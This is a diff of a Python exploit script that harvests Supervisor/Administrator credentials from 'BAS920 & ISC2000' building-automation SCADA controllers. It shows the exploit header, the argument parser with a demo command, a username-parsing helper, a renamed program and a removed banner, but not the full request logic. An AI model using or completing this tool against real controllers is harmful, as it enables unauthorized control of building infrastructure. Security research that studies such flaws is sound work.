@@ -15,16 +15,6 @@ class Colors:
     BOLD 		= '\033[1m'
     BR_COLOUR 	= '\033[1;37;40m'
 
-banner = '''
-
-		|=--------------------------------------------------------------------=|
-		|=-------=[ SCADAS "BAS920 & ISC2000"; credentials exposed ]=---------=|
-		|=--------------------------=[ 29 dic 2017 ]=-------------------------=|
-		|=-------------------------=[  Researcher:  ]=------------------------=|
-		|=----------------------=[ Fernandez Ezequiel ]=----------------------=|
-		|=--------------------------------------------------------------------=|
-'''
-
 details = ''' 
  # Exploit Title: 	SCADAS "BAS920 & ISC2000"; Credentials Exposed
  # Date: 		22/12/2017
@@ -35,9 +25,9 @@ details = '''
 '''
 # https://en.wikipedia.org/wiki/Building_automation
 
-parser = argparse.ArgumentParser(prog='cafeina.py',
-								description=' [+] obtaining the credential information for the Supervisor/Administrator account', 
-								epilog='[+] Demo: python cafeina.py --host 192.168.1.101 -p 81',
+parser = argparse.ArgumentParser(prog='plinplanplum.py',
+								description=' [+] Obtaining all credentials for the Supervisor/Administrator account', 
+								epilog='[+] Demo: python plinplanplum.py --host 192.168.1.101 -p 81',
 								version="1.0.1")
 
 parser.add_argument('--host', 	dest="HOST",  	help='Host',	required=True)
@@ -67,7 +57,6 @@ def getUsr(USRs):
 		if len(usuario) > 0:
 			usrList.append(usuario)
 	return usrList
-
 
 def makeReqHeaders():
 	headers["Host"] 			=  host
